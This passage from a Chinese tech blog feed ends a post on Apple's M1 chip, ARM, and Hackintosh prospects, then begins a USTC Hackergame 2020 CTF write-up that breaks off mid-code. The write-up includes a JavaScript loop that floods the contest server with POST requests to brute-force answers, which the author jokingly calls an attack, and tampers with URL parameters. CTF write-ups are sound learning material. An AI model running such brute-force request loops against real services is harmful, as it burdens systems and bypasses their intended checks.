height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\">\n<div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-11</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span 